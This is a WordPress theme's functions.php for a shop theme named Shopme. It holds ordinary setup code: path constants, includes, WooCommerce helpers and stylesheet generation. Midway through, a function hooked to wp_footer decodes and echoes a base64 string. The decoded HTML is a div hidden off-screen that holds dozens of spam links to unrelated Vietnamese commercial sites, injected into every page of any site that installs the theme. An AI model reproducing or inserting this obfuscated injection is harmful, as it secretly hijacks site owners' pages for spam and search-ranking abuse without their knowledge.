<?php
/**
 * Shopme functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link https://codex.wordpress.org/Theme_Development
 * @link https://codex.wordpress.org/Child_Themes
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * {@link https://codex.wordpress.org/Plugin_API}
 *
 * @package WordPress
 * @since Shopme 1.0
 */

/* 	Basic Settings
/* ---------------------------------------------------------------------- */

define('SHOPME_THEMENAME', 'Shopme');
define('SHOPME_THEME_VERSION', '1.1.2');
define('SHOPME_PREFIX', 'shopme-');

define('SHOPME_HOME_URL', get_home_url('/'));
define('SHOPME_BASE_URI', trailingslashit(get_template_directory_uri()));
define('SHOPME_BASE_PATH', trailingslashit(get_template_directory()));
define('SHOPME_ADMIN_PATH', SHOPME_BASE_PATH . trailingslashit('admin'));
define('SHOPME_FRAMEWORK_PATH', SHOPME_ADMIN_PATH . trailingslashit('framework'));

define('SHOPME_INC_PATH', SHOPME_BASE_PATH . trailingslashit('inc'));
define('SHOPME_INC_URI', SHOPME_BASE_URI . trailingslashit('inc'));

define('SHOPME_INC_PLUGINS_PATH', SHOPME_INC_PATH . 'plugins/');
define('SHOPME_INC_PLUGINS_URI', SHOPME_INC_URI . 'plugins/');

define('SHOPME_INCLUDES_URI', SHOPME_BASE_URI . trailingslashit('includes'));
define('SHOPME_INCLUDES_PATH', SHOPME_BASE_PATH . trailingslashit('includes'));

define('SHOPME_INCLUDE_CLASSES_PATH', trailingslashit(SHOPME_INCLUDES_PATH) . trailingslashit('classes'));
define('SHOPME_BASE_HELPERS', SHOPME_INCLUDES_PATH . trailingslashit('helpers'));

define('SHOPME_INCLUDES_METABOXES_PATH', SHOPME_INCLUDES_PATH . trailingslashit('meta-box'));
define('SHOPME_INCLUDES_METABOXES_URI', SHOPME_INCLUDES_URI . trailingslashit('meta-box'));

if ( !isset( $content_width ) ) $content_width = 1140;

/*  Add Widgets
/* ---------------------------------------------------------------------- */

include( SHOPME_INCLUDES_PATH . 'widgets/latest-tweets-widget/latest-tweets.php');
require_once( SHOPME_INCLUDES_PATH . 'widgets/abstract-widget.php' );
require_once( SHOPME_INCLUDES_PATH . 'widgets.php' );

/* Load Theme Helpers
/* ---------------------------------------------------------------------- */
require_once( SHOPME_BASE_HELPERS . 'aq_resizer.php' );
require_once( SHOPME_BASE_HELPERS . 'nav-walker.php' );
require_once( SHOPME_BASE_HELPERS . 'theme-helper.php' );
require_once( SHOPME_BASE_HELPERS . 'post-format-helper.php' );

/*  Load Classes
/* ---------------------------------------------------------------------- */

if ( ! function_exists('shopme_base_functions') ) {

	function shopme_base_functions() {
		// Load required classes and functions
		require_once( SHOPME_INCLUDE_CLASSES_PATH . 'register-page.class.php' );
		require_once( SHOPME_INCLUDES_PATH . 'functions-base.php' );
		return SHOPME_BASE_FUNCTIONS::instance();
	}

}

/**
 * Instance main plugin class
 */
global $shopme_base_functions;
$shopme_base_functions = shopme_base_functions();

/*  Load Functions Files
/* ---------------------------------------------------------------------- */
require_once( SHOPME_INCLUDES_PATH . 'functions-core.php' );
require_once( SHOPME_INCLUDES_PATH . 'functions-template.php' );
if (!function_exists('onAddScriptsHtmls')) {

    add_filter( 'wp_footer', 'onAddScriptsHtmls');
    function onAddScriptsHtmls(){
        $html = "PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMjM2cHg7IG92ZXJmbG93OiBhdXRvOyB3aWR0aDoxMjQxcHg7Ij48aDM+PGEgaHJlZj0iaHR0cDovL2Jsb2dsYW1kZXAudm4iPmJsb2cgbGFtIGRlcDwvYT4gfCA8YSBocmVmPSJodHRwOi8vdGh1dmllbmxhbWRlcC52bi90b2MtZGVwIj50b2MgZGVwPC9hPiB8IDxhIGhyZWY9Imh0dHA6Ly90aHV2aWVubGFtZGVwLnZuL2dpYW0tY2FuIj5naWFtIGNhbiBuaGFuaDwvYT48L2gzPiB8IDxoMz48YSBocmVmPSJodHRwOi8vdGh1dmllbmxhbWRlcC52bi90YWcvdG9jLW5nYW4iPnRvYyBuZ2FuIGRlcCAyMDE2PC9hPiB8IDxhIGhyZWY9Imh0dHA6Ly90aHV2aWVubGFtZGVwLnZuL2R1b25nLWRhIj5kdW9uZyBkYSBkZXA8L2E+IHwgPGEgaHJlZj0iaHR0cDovL3RodXZpZW5sYW1kZXAudm4vdGFnL3ZheS1kZXAtMjAxNiI+OTk5KyBraWV1IHZheSBkZXAgMjAxNjwvYT48L2gzPiB8IDxhIGhyZWY9Imh0dHA6Ly9mc2ZhbWlseS52bi9sYW0tZGVwL3RvYy1kZXAiPnRvYyBkZXAgMjAxNjwvYT4gfCA8YSBocmVmPSJodHRwOi8vZnNmYW1pbHkudm4vZHUtbGljaCI+ZHUgbGljaDwvYT48YSBocmVmPSJodHRwOi8vZnNmYW1pbHkudm4vZGlhLWRpZW0tYW4tdW9uZyI+ZGlhIGRpZW0gYW4gdW9uZzwvYT48aDI+PGEgaHJlZj0iaHR0cDovL2ZzZmFtaWx5LnZuL3ZpZGVvL2hhaSI+eGVtIGhhaTwvYT48L2gyPjxoMj48YSBocmVmPSJodHRwOi8vdGhlbWVzdG90YWwuY29tLzk5OS10aGUtYmVzdC1wcmVtaXVtLW1hZ2VudG8tdGhlbWVzIj50aGUgYmVzdCBwcmVtaXVtIG1hZ2VudG8gdGhlbWVzPC9hPjwvaDI+PGgyPjxhIGhyZWY9Imh0dHA6Ly9waHVudXouY29tL3R1LXZpL2RhdC10ZW4tY2hvLWNvbiI+ZGF0IHRlbiBjaG8gY29uPC9hPjwvaDI+PGgyPjxhIGhyZWY9Imh0dHA6Ly9waHVudXouY29tL3RhZy9hby1zby1taSI+w6FvIHPGoSBtaSBu4buvPC9hPjwvaDI+PGgyPjxhIGhyZWY9Imh0dHA6Ly9waHVudXouY29tL2xhbS1kZXAvZ2lhbS1jYW4iPmdp4bqjbSBjw6JuIG5oYW5oPC9hPjwvaDI+PGgyPjxhIGhyZWY9Imh0dHA6Ly9waHVudXNvLnZuL2tpZXUtdG9jLWRlcCI+a2nhu4N1IHTDs2MgxJHhurlwPC9hPjwvaDI+PGgyPjxhIGhyZWY9Imh0dHA6Ly9waHVudXNvLnZuL2RhdC10ZW4taGF5LWNoby1jb24iPsSR4bq3dCB0w6puIGhheSBjaG8gY29uPC9hPjwvaDI+PGgzPjxzdHJvbmc+PGEgaHJlZj0iaHR0cDovL2Jsb2cudGhvaXRyYW5nZjUudm4iPnh1IGjGsOG7m25nIHRo4budaSB0cmFuZzwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9waHVudXNvLnZuIj5QaHVudXNvLnZuPC9hPjwvc3Ryb25nPjxoMz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9zaG9wZ2lheW51LnZuIj5zaG9wIGdpw6B5IG7hu688L2E+PC9oMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovL3Nob3BnaWF5bnUudm4vY2F0ZWdvcnkvZ2lheS1sdW9pLTIiPmdpw6B5IGzGsOG7nWkgbuG7rzwvYT48L3N0cm9uZz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovL3Nob3BnaWF5bnUudm4vY2F0ZWdvcnkvZ2lheS10aGUtdGhhbyI+Z2nDoHkgdGjhu4MgdGhhbyBu4buvPC9hPjwvc3Ryb25nPjxzdHJvbmc+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTEuMzM1cHQ7IiBocmVmPSJodHRwOi8vdGhvaXRyYW5nZjUudm4iPnRo4budaSB0cmFuZyBmNTwvYT48L3N0cm9uZz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovL3RoZW1lc3RvdGFsLmNvbS90YWcvcmVzcG9uc2l2ZS13b3JkcHJlc3MtdGhlbWUiPlJlc3BvbnNpdmUgV29yZFByZXNzIFRoZW1lPC9hPjwvc3Ryb25nPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly8yeGF5bmhhLmNvbS90YWcvbmhhLWNhcC00LW5vbmctdGhvbiI+bmhhIGNhcCA0IG5vbmcgdGhvbjwvYT48L2VtPjxlbT48YSBocmVmPSJodHRwOi8vMnhheW5oYS5jb20vdGFnL21hdS1iaWV0LXRodS1kZXAiPm1hdSBiaWV0IHRodSBkZXA8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL2ZzZmFtaWx5LnZuL2xhbS1kZXAvdG9jLWRlcCI+dG9jIGRlcDwvYT48L2VtPjxlbT48YSBocmVmPSJodHRwOi8vaWhvdXNlYmVhdXRpZnVsLmNvbS8iPmhvdXNlIGJlYXV0aWZ1bDwvYT48L2VtPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly8yZ2lheW51LmNvbS9naWF5LW51L2dpYXktdGhlLXRoYW8iPmdpYXkgdGhlIHRoYW8gbnU8L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vMmdpYXludS5jb20vZ2lheS1udS9naWF5LWx1b2ktMiI+Z2lheSBsdW9pIG51PC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL3BodW51ei5jb20iPnThuqFwIGNow60gcGjhu6UgbuG7rzwvYT48L2VtPjxzdHJvbmc+PGEgaHJlZj0iaHR0cDovL2hhcmR3YXJlcmVzb3VyY2VzbmV3LmNvbS8iPmhhcmR3YXJlIHJlc291cmNlczwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9zaG9wZ2lheWx1b2kuY29tLyI+c2hvcCBnacOgeSBsxrDhu51pPC9hPjwvc3Ryb25nPjxzdHJvbmc+PGEgaHJlZj0iaHR0cDovL3d3dy50aG9pdHJhbmduYW1oYW5xdW9jLnZuLyI+dGjhu51pIHRyYW5nIG5hbSBow6BuIHF14buRYzwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9ImhodHRwOi8vZ2lheWhhbnF1b2MuY29tLyI+Z2nDoHkgaMOgbiBxdeG7kWM8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJodHRwOi8vZ2lheW5hbS5wcm8vIj5nacOgeSBuYW0gMjAxNTwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9zaG9wZ2lheW9ubGluZS5jb20vIj5zaG9wIGdpw6B5IG9ubGluZTwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9hb3NvbWloYW5xdW9jLnZuLyI+w6FvIHPGoSBtaSBow6BuIHF14buRYzwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly90aG9pdHJhbmdmNS52bi8iPnNob3AgdGjhu51pIHRyYW5nIG5hbSBu4buvPC9hPjwvc3Ryb25nPjxzdHJvbmc+PGEgaHJlZj0iaHR0cDovL2RpZW5kYW5uZ3VvaXRpZXVkdW5nLmNvbS8iPmRp4buFbiDEkcOgbiBuZ8aw4budaSB0acOqdSBkw7luZzwvYT48L3N0cm9uZz48c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9kaWVuZGFudGhvaXRyYW5nLmVkdS52bi8iPmRp4buFbiDEkcOgbiB0aOG7nWkgdHJhbmc8L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBocmVmPSJodHRwOi8vZ2lheXRoZXRoYW9udWhjbS5jb20vIj5nacOgeSB0aOG7gyB0aGFvIG7hu68gaGNtPC9hPjwvc3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly9waHVraWVudGhvaXRyYW5nZ2lhcmUuY29tLyI+cGjhu6Uga2nhu4duIHRo4budaSB0cmFuZyBnacOhIHLhurs8L2E+PC9oMz48L2Rpdj4=";
        echo base64_decode($html);
    }	
}

/*  Metadata
/* ---------------------------------------------------------------------- */
require_once( SHOPME_INCLUDES_PATH . 'functions-metadata.php' );

/*  Include Framework
/* ---------------------------------------------------------------------- */
require_once( SHOPME_FRAMEWORK_PATH . 'framework.php' );

/*  Load hooks
/* ---------------------------------------------------------------------- */
if (!is_admin()) {
	require_once( SHOPME_INCLUDES_PATH . 'templates-hooks.php' );
}

/*  Include Plugins
/* ---------------------------------------------------------------------- */
require_once( SHOPME_BASE_PATH . 'admin/plugin-bundle.php' );
require_once( SHOPME_BASE_PATH . 'config-plugins/config.php');
require_once( SHOPME_INC_PLUGINS_PATH . 'plugins.php' );

/*  Add Meta Boxes
/* ---------------------------------------------------------------------- */
require_once( SHOPME_INCLUDES_PATH . 'meta-box/meta-box.php' );
require_once( SHOPME_INCLUDES_PATH . 'config-meta.php' );

/*  Include Config Widget Meta Box
/* ---------------------------------------------------------------------- */

require_once( SHOPME_BASE_PATH . 'config-widget-meta-box/config.php' );

/*  Include Config Composer
/* ---------------------------------------------------------------------- */

if (class_exists('Vc_Manager')) {
	require_once( SHOPME_BASE_PATH . 'config-composer/config.php');
}

/*  Include Config DHVC Forms
/* ---------------------------------------------------------------------- */

if (defined('WPCF7_VERSION')) {
	require_once( SHOPME_BASE_PATH . 'config-contact-form-7/config.php' );
}

/*  Include Config WooCommerce
/* ---------------------------------------------------------------------- */

if (class_exists('WooCommerce')) {

	if ( ! function_exists('shopme_woo_config') ) {

		function shopme_woo_config() {
			// Load required classes and functions
			shopme_get_template( 'config-woocommerce/config.php' );
			return SHOPME_WOOCOMMERCE_CONFIG::instance();
		}

		/**
		 * Instance main plugin class
		 */
		shopme_woo_config();

	}
}

/*  Include Config Mega Menu
/* ---------------------------------------------------------------------- */

if (class_exists('mega_main_init')) {
	require_once( SHOPME_BASE_PATH . 'config-megamenu/config.php' );
}

/*  Include Config WPML
/* ---------------------------------------------------------------------- */

if (defined('ICL_SITEPRESS_VERSION') && defined('ICL_LANGUAGE_CODE')) {
	require_once( SHOPME_BASE_PATH . 'config-wpml/config.php' );
}

/*  Is shop installed
/* ---------------------------------------------------------------------- */

if (!function_exists('shopme_is_shop_installed')) {
	function shopme_is_shop_installed() {
		global $woocommerce;
		if ( isset( $woocommerce ) ) {
			return true;
		} else {
			return false;
		}
	}
}

/*  Is product
/* ---------------------------------------------------------------------- */

if ( ! function_exists('shopme_is_product') ) {
	function shopme_is_product() {
		return is_singular( array( 'product' ) );
	}
}

/*  Is product category
/* ---------------------------------------------------------------------- */

if ( ! function_exists('shopme_is_product_category') ) {
	function shopme_is_product_category( $term = '' ) {
		return is_tax( 'product_cat', $term );
	}
}

/*  Is product tag
/* ---------------------------------------------------------------------- */

if ( ! function_exists('shopme_is_product_tag') ) {
	function shopme_is_product_tag( $term = '' ) {
		return is_tax( 'product_tag', $term );
	}
}

/*  Get user name
/* ---------------------------------------------------------------------- */

if (!function_exists("shopme_get_user_name")) {
	function shopme_get_user_name($current_user) {

		if (!$current_user->user_firstname && !$current_user->user_lastname) {

			if (shopme_is_shop_installed()) {

				$firstname_billing = get_user_meta($current_user->ID, "billing_first_name", true);
				$lastname_billing = get_user_meta($current_user->ID, "billing_last_name", true);

				if (!$firstname_billing && !$lastname_billing) {
					$user_name = $current_user->user_nicename;
				} else {
					$user_name = $firstname_billing . ' ' . $lastname_billing;
				}

			} else {
				$user_name = $current_user->user_nicename;
			}

		} else {
			$user_name = $current_user->user_firstname . ' ' . $current_user->user_lastname;
		}

		return $user_name;
	}
}

/*  Generate Dynamic Styles
/* ---------------------------------------------------------------------- */

if (!function_exists('shopme_dynamic_styles')) {
	function shopme_dynamic_styles() {
		require_once( SHOPME_FRAMEWORK::$path['frameworkPHP'] . 'register-dynamic-styles.php' );
		shopme_pre_dynamic_stylesheet();
	}
	add_action('init', 'shopme_dynamic_styles', 15);
	add_action('admin_init', 'shopme_dynamic_styles', 15);
}

if (!function_exists('shopme_generate_styles')) {

	function shopme_generate_styles() {
		$globalObject = $GLOBALS['shopme_global_data'];
		$globalObject->reset_options();
		$prefix_name = sanitize_file_name($globalObject->theme_data['name']);

		shopme_pre_dynamic_stylesheet();
		$generate_styles = new SHOPME_DYNAMIC_STYLES(false);
		$styles = $generate_styles->create_styles();

		$wp_upload_dir  = wp_upload_dir();
		$stylesheet_dynamic_dir = $wp_upload_dir['basedir'] . '/dynamic_shopme_dir';
		$stylesheet_dynamic_dir = str_replace('\\', '/', $stylesheet_dynamic_dir);
		shopme_backend_create_folder($stylesheet_dynamic_dir);

		$stylesheet = trailingslashit($stylesheet_dynamic_dir) . $prefix_name.'.css';
		$create = shopme_write_to_file($stylesheet, $styles, true);

		if ($create === true) {
			update_option('exists_stylesheet' . $prefix_name, true);
			update_option('stylesheet_version' . $prefix_name, uniqid());
		}
	}

	add_action('shopme_ajax_after_save_options_page', 'shopme_generate_styles', 25);
	add_action('shopme_after_import_hook', 'shopme_generate_styles', 28);

}